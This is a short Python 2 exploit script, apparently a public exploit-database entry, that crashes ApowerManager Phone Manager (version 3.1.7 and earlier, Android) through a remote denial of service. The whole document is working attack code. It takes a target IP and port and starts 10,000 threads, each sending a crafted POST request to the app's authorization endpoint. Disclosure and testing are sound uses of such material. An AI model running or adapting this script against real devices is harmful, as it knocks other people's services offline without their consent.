#!/usr/bin/python
#coding: utf-8

# *********************************************************************
# *             Author: Marcelo Vázquez (aka s4vitar)                 *
# *  ApowerManager Remote Denial of Service (DoS) / Application Crash *
# *********************************************************************

# Exploit Title: ApowerManager - Phone Manager Remote Denial of Service (DoS) / Application Crash
# Date: 2019-02-14
# Exploit Author: Marcelo Vázquez (aka s4vitar)
# Vendor Homepage: https://www.apowersoft.com/phone-manager
# Software Link: https://www.apkmonk.com/download-app/com.apowersoft.phone.manager/4_com.apowersoft.phone.manager_2019-01-08.apk/
# Version: <= ApowerManager - Phone Manager 3.1.7
# Tested on: Android

import sys, requests, threading, signal

def handler(signum, frame):
        print '\nFinishing program...\n'
        sys.exit(0)

if len(sys.argv) != 3:
	print "\nUsage: python " + sys.argv[0] + " <ip_address> <port>\n"
	print "Example: python apowermanager_dos.py 192.168.1.125 2333\n"
	sys.exit(0)

def startAttack(url):
	url_destination = url + '/?Key=PhoneRequestAuthorization'
	headers = {'Origin': url, 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36', 'Content-Type': 'text/plain;charset=UTF-8', 'accept': 'text/plain', 'Referer': url, 'Connection': 'keep-alive'}

	r = requests.post(url_destination, headers=headers)

if __name__ == '__main__':

	signal.signal(signal.SIGINT, handler)
	url = 'http://' + sys.argv[1] + ':' + sys.argv[2]

	threads = []

	for i in xrange(0, 10000):
		t = threading.Thread(target=startAttack, args=(url,))
		threads.append(t)

	for x in threads:
		x.start()

	for x in threads:
		x.join()